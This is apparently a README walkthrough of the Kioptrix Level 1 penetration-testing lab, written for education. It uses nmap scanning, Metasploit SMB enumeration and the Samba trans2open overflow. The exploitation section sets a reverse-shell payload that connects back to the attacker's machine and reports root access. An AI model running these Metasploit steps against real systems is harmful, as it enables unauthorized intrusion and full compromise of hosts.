<h1 align="center">Kioptrix Level 1 Penetration Testing Walkthrough</h1>
<h3 align="center"> BOOT TO ROOT</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
</p>

---

## Kioptrix Level 1 Walthrough
## 📋 Overview
This guide documents the complete penetration testing methodology for Kioptrix Level 1, detailing each step from initial reconnaissance to privilege escalation and flag capture (Be root since there is no flag in Kioptrix 1 machine).

## 🎯 Objectives
- Identify the target system and open services.
- Enumerate users and services.
- Exploit vulnerabilities to gain initial access.
- Escalate privileges to obtain root access.
- Capture the "flag".

## 1. Reconnaissance.
### **Network Discovery.**
- We will first run the command; 
> $ifconfig 
---
- To check what ip is allocated to the attacking machine and also determine the subnet range.

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-1-Walkthrough/blob/main/Screenshots/IFCONFIG.PNG" alt="Webpage Result" width="600"/> </p>

### **Host Discovery**
> $nmap -sn 192.168.56.1/24
---
- We are trying to do a ping sweep to identify live hosts within the subnet.

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-1-Walkthrough/blob/main/Screenshots/Hostdiscovery.PNG" alt="Webpage Result" width="600"/> </p>


### **Port Scan**
> $nmap -p- -A 192.168.56.110
---
- Scans all ports. **-A** flag is for aggressive mode that bundles multiple flags for OS and service detection.

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-1-Walkthrough/blob/main/Screenshots/nmap.PNG" alt="Webpage Result" width="600"/> </p>


### Findings
From our previous scan we can see that:
- port 22 (ssh), 80 (http), 111 (RPC) 443 (https) 139 (SMB) and 32768 (RPC)

## 2. Enumeration.
- We navigate to port 80 http://192.168.56.110:80
- We have a test page with nothing meaningful.

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-1-Walkthrough/blob/main/Screenshots/http80.PNG" alt="Webpage Result" width="600"/> </p>

- We navigate to port 443 http://192.168.56.110:443

- We get a bad request

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-1-Walkthrough/blob/main/Screenshots/http443.PNG" alt="Webpage Result" width="600"/> </p>

### **SMB Enumeration**
- We try to use **enum4linux** but we don't get the smb version running. We try **Metasploit *ramework**
### Commands
> msf > search smb version detection
---
> msf > use 0
---
> msf > show options
---
> msf > set RHOST 192.168.56.110
---
> msf > run
---
> msf > exit
---

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-1-Walkthrough/blob/main/Screenshots/Msf1.PNG" alt="Webpage Result" width="600"/> </p>

- From the scan we get the SMB version **2.2.1a**


- We use **searchsploit** a kali linux tool that has a database of known exploits.
> searchsploit samba 2.2
---


<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-1-Walkthrough/blob/main/Screenshots/searchsploit.PNG" alt="Webpage Result" width="600"/> </p>


- We find the exploit **trans2open Overflow**


## 3. Exploitation and Privilege Escalation.
- We spawn **MetaSploit Framework**.
### Commands

> msf > search trans2open
---
- We see multiple modules but we want the linux module since we saw that it was running on RedHat Linux.

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-1-Walkthrough/blob/main/Screenshots/Msf2.PNG" alt="Webpage Result" width="600"/> </p>

> msf > use 1
> msf > show options
> msf > set RHOST 192.168.56.110
----
- The Kioptrix 1 Machine IP 
> msf > set LHOST 192.168.56.15
---
- Our attack machine (Kali)
> msf > set payload generic/reverse_shell_tcp
---
- Fits into smaller memory buffers unlike the defaults.
> msf run

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-1-Walkthrough/blob/main/Screenshots/Msf3.PNG" alt="Webpage Result" width="600"/> </p>

> whoami
---
- We have succefully pawned the machine. We are Root. 

## NB: There are other methods to obtain root like using the "Open2Fuckv2.c".

## 🔧 Tools Used

```bash
🛡️ Network & Service Discovery:
- ifconfig · Nmap · 

🔓 Exploitation Tools:
- Metasploit Frame work.

🔍 Information Gathering:
- Searchsplot, Metasploit search module

💻 System Tools:
- bash · sudo · 
```

<p align="center"> <strong>Documentation created for educational purposes</strong><br> All techniques should be practiced only in controlled, authorized environments. </p>

